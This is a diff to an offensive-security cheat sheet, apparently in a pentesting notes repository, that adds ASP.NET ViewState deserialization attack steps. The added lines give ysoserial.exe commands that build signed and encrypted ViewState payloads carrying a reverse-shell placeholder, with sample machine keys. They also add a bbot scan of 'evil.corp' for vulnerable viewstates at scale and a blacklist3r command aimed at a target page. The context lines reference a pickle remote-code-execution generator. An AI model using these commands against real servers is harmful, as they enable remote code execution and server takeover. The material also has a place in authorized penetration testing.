@@ -63,7 +63,7 @@ print(base64.b64encode(pickle.dumps(RCE())).decode())
 
 ## Sensitive files: web.config
 
-## Tools: https://github.com/pwntester/ysoserial.net
+## Tools: https://github.com/pwntester/ysoserial.net https://github.com/blacklanternsecurity/badsecrets
 
 ## Resources: https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
 
@@ -85,4 +85,12 @@ print(base64.b64encode(pickle.dumps(RCE())).decode())
 
  - ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "REVERSE_SHELL_PAYLOAD_HERE" (Use this if ViewState is NOT MAC protected)
 
- - 
+ - ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "REVERSE_SHELL_PAYLOAD" --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" --apppath="/" --path="/vulnerable/vuln.aspx" (Use this if you have found the key)
+
+ - --generator = {__VIWESTATEGENERATOR parameter value} (Append this to previous command if you don't have the key so that you can generate it)
+
+ - bbot -f subdomain-enum -m badsecrets -t evil.corp (Check for vulnerable viewstates at scale)
+
+ - python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx (Directly target the URL and try to carve the viewstate out of the HTML)
+
+ - ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "REVERSE_SHELL_PAYLOAD" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" (Generate a payload once you have found valid keys)
